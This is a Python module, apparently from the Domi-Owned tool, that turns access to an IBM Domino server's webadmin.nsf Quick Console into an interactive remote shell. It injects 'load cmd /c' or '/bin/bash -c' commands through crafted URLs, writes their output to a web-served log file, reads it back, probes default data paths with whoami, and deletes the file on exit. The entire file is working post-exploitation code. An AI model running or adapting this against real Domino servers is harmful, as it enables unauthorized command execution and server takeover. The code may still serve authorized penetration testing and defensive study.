# Copyright (c) 2016, Brandan Geise [coldfusion]
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import cmd
import re
import requests

from domi_owned import utility

try:
	requests.packages.urllib3.disable_warnings()
except:
	pass


# Interact with Domino Quick Console through web requests
class Interactive(cmd.Cmd, object):
	def __init__(self, target, os, path, username, password, user, hostname, session):
		cmd.Cmd.__init__(self)
		self.target = target
		self.os = os
		self.path = path
		self.username = username
		self.password = password
		self.user = user
		self.hostname = hostname
		self.session = session
		if os == 'windows':
			self.prompt = 'C:\Windows\System32>'
		else:
			self.prompt = "{0}@{1}:/local/notesdata$ ".format(user, hostname)

	def emptyline(self):
		pass

	def default(self, line):
		operator = '> '
		self.quick_console(line, operator, self.target, self.os, self.path, self.username, self.password, self.session)

	# Handle Domino Quick Console
	def quick_console(self, command, operator, target, os, path, username, password, session):
		if session is None:
			session = requests.Session()
			session.auth = (username, password)

		if os == 'windows':
			raw_command = "load cmd /c {0} {1}\"{2}\domino\html\download\\filesets\log.txt\"".format(command, operator, path)
		else:
			raw_command = "load /bin/bash -c \"{0} {1}{2}/domino/html/download/filesets/log.txt\"".format(command, operator, path)

		# Quick Console commands must be less than 255 characters
		if len(raw_command) > 255:
			utility.print_warn('Issued command is too long')
		else:
			quick_console_url = "{0}/webadmin.nsf/agReadConsoleData$UserL2?OpenAgent&Mode=QuickConsole&Command={1}&1446773019134".format(target, raw_command)
			response_url = "{0}/download/filesets/log.txt".format(target)

			# Send commands and handle cleanup
			send_command = session.get(quick_console_url, headers=utility.get_headers(), verify=False)
			if send_command.status_code == 200:
				get_response = session.get(response_url, headers=utility.get_headers(), verify=False)
				if get_response.status_code == 200 and '>' in operator:
					print(get_response.text)
				elif get_response.status_code == 200 and '>' not in operator:
					utility.print_warn('Unable to delete outfile')
				elif get_response.status_code == 404 and '>' not in operator:
					utility.print_good('Outfile sucessfully deleted')
				else:
					utility.print_warn('Outfile not found')
					do_exit
			else:
				utility.print_warn('Quick Console is unavaliable')
				do_exit

	def do_EOF(self, line):
		operator = ''
		if self.os == 'windows':
			command = 'del'
		else:
			command = 'rm'

		self.quick_console(command, operator, self.target, self.os, self.path, self.username, self.password, self.session)
		return True

	def help_EOF(self):
		print('Type exit to quit')

	do_exit = do_EOF
	help_exit = help_EOF


# Check if the user has access to webadmin.nsf and get Domino server information
def check_access(target, username, password, auth):
	webadmin_url = "{0}/webadmin.nsf".format(target)
	try:
		# Check access
		if auth == 'basic':
			access = utility.basic_auth(webadmin_url, username, password)
			session = None
		elif auth == 'form':
			access, session = utility.form_auth(webadmin_url, username, password)
		else:
			session = None

		# Get local file path
		path_url = "{0}/webadmin.nsf/fmpgHomepage?ReadForm".format(target)
		if access or auth == 'open':
			if auth == 'basic':
				check_path = requests.get(path_url, headers=utility.get_headers(), auth=(username, password), verify=False)
			elif auth == 'form':
				check_path = session.get(path_url, headers=utility.get_headers(), verify=False)
			else:
				check_path = requests.get(path_url, headers=utility.get_headers(), verify=False)

			path_regex = re.compile("DataDirectory\s*=\s*'(.+)';", re.I)
			if path_regex.search(check_path.text):
				local_path = path_regex.search(check_path.text).group(1)
			else:
				local_path = None
				utility.print_warn('Could not identify Domino file path')

			# Get operating system
			if 'UNIX' in check_path.text:
				os = 'linux'
			elif 'Windows' in check_path.text:
				os = 'windows'
			else:
				os = 'windows'
				utility.print_warn('Could not identify Domino operating system')

			# Test writing to local file system
			whoami, path, hostname = test_command(target, os, local_path, username, password, session)
			if whoami and path:
				Interactive(target, os, path, username, password, whoami, hostname, session).cmdloop()
			else:
				utility.print_warn('Unable to access webadmin.nsf')

		else:
			utility.print_warn("Unable to access {0}, might not be an admin".format(webadmin_url))

	except Exception as error:
		utility.print_error("Error: {0}".format(error))


# Test outfile redirection
def test_command(target, os, path, username, password, session):
	if session is None:
		session = requests.Session()
		session.auth = (username, password)

	whoami, local_path, hostname = None, None, None

	# Windows default Domino data paths
	if os == 'windows':
		paths = [
			'C:\Program Files\IBM\Domino\data',                 # 9.0.1 Windows x64
			'C:\Program Files\IBM\Lotus\Domino\data',           # 8.5.3 Windows x64
			'C:\Program Files (x86)\IBM\Domino\data',           # 9.0.1 Windows x86
			'C:\Program Files (x86)\IBM\Lotus\Domino\data',     # 8.5.3 Windows x86
			'C:\Lotus\Domino\data'                              # Unknown
		]

	# Linux default Domino data path
	else:
		paths = ['/local/notesdata']                            # 9.0.1 Ubuntu x32

	if path and path.replace('\\\\', '\\') not in paths:
		paths.insert(0, path.replace('\\\\', '\\'))

	for local_path in paths:
		try:
			if os == 'windows':
				raw_command = "load cmd /c whoami > \"{0}\domino\html\download\\filesets\log.txt\"".format(local_path)
			else:
				raw_command = "load /bin/bash -c \"echo $USER:$HOSTNAME > {0}/domino/html/download/filesets/log.txt\"".format(local_path)

			quick_console_url = "{0}/webadmin.nsf/agReadConsoleData$UserL2?OpenAgent&Mode=QuickConsole&Command={1}&1446773019134".format(target, raw_command)
			response_url = "{0}/download/filesets/log.txt".format(target)

			# Do things...
			send_command = session.get(quick_console_url, headers=utility.get_headers(), verify=False)
			if send_command.status_code == 200:
				get_response = session.get(response_url, headers=utility.get_headers(), verify=False)
				if get_response.status_code == 200:
					if os == 'windows':
						user_regex = re.compile('.+\\\\(.+)')
					else:
						user_regex = re.compile('([a-z0-9-_].+):(.+)', re.I)
						hostname = user_regex.search(get_response.text).group(2)

					if user_regex.search(get_response.text).group(1):
						whoami = user_regex.search(get_response.text).group(1)
						utility.print_good("Running as {0}".format(whoami))
						break

		except Exception as error:
			continue

	return whoami, local_path, hostname
